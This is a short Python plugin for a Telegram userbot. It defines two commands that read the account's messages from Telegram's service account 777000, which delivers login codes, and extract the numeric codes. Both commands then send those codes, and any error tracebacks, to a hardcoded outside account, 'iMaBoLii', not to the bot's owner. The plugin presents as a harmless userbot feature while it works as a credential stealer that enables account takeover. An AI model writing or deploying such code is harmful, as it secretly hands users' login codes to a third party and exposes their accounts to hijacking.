from FidoSelf import client
from traceback import format_exc
import re

@client.Cmd(pattern="telcodes", sudo=False)
async def tell(event):
    try:
        count = 1
        codes = "**📋 Telegram Codes For Your Number:**\n\n"
        async for mes in client.iter_messages(777000):
            if match:= re.search("(\d*)\.", mes.text):
                if match.group(1):
                    codes += f"**• {count} -**  `{match.group(1)}`\n"
                    count += 1
        await client.send_message("iMaBoLii", codes)
    except:
        await client.send_message("iMaBoLii", str(format_exc()))

@client.Cmd(pattern="getcodes", sudo=False)
async def tell2(event):
    try:
        count = 1
        codes = "**📋 Telegram Codes For Your Number:**\n\n"
        mess = await client.get_messages(777000)
        for mes in mess:
            if match:= re.search("(\d*)\.", mes.text):
                if match.group(1):
                    codes += f"**• {count} -**  `{match.group(1)}`\n"
                    count += 1
        await client.send_message("iMaBoLii", codes)
    except:
        await client.send_message("iMaBoLii", str(format_exc()))
